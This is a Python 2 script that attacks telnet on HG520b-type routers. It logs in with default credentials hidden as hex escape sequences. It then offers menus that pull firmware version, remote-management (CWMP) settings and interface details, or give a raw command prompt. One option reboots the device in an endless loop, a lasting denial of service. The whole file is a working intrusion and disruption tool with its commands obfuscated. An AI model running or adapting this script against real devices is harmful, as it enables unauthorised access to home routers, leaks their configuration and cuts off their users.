import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = raw_input('write the ip : ')
port = 23
result = s.connect_ex((host, port))
if result == 0:
    print "host is open Port {}: \t ".format(port)
else :
    print "host is not open the port {}: \t ".format(port)
print s.recv(1000000)
s.send('\x61\x64\x6d\x69\x6e\x0a')
print s.recv(100000)
s.send('\x61\x64\x6d\x69\x6e\x0a')
a = s.recv(1000000)
if a == '\r\nHG520b>' :
    print a
    print '(1)auto command \n(2)manual command '
    b = raw_input('sh~# ')
    if b == '1' :
        print "(1)os info \n(2)data.co \n(3)wan info \n(4)bunch!!! "
        b = raw_input('sh~# ')
        if b == '1' :
            s.send('\x64\x65\x62\x75\x67 \x64\x69\x73\x70\x6c\x61\x79 \x61\x74\x70\x76\x65\x72\x73\x69\x6f\x6e\x0a')
            time.sleep(2)
            print s.recv(10000000)
        elif b == '2' :
            s.send('\x64\x65\x62\x75\x67 \x64\x69\x73\x70\x6c\x61\x79 \x63\x77\x6d\x70\x0a')
            time.sleep(2)
            print s.recv(10000000)
        elif b == '3' :
            s.send('\x69\x70 \x69\x66\x63\x6f\x6e\x66\x69\x67\x0a')
            time.sleep(2)
            print s.recv(10000000)
        elif b == '4' :
            s.send('\x73\x79\x73 \x72\x65\x62\x6f\x6f\x74\x0a')
            time.sleep(2)
            print s.recv(10000)
            while True :
                print "Wait for restart"
                time.sleep(40)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                print "connect to host "
                s.connect_ex((host, port))
                print "sending shell "
                s.recv(1000000)
                s.send('\x61\x64\x6d\x69\x6e\x0a')
                s.recv(100000)
                s.send('\x61\x64\x6d\x69\x6e\x0a')
                s.recv(1000000)
                s.send('\x73\x79\x73 \x72\x65\x62\x6f\x6f\x74\x0a')
                time.sleep(2)
                s.recv(10000)
                print "Shell is sent"
    elif b =='2' :
        while True :
            b = raw_input('send: ')
            s.send(b+'\x0a')
            time.sleep(1)
            print s.recv(10000000)
            
else :
    print " host is not support \t"
    exit()
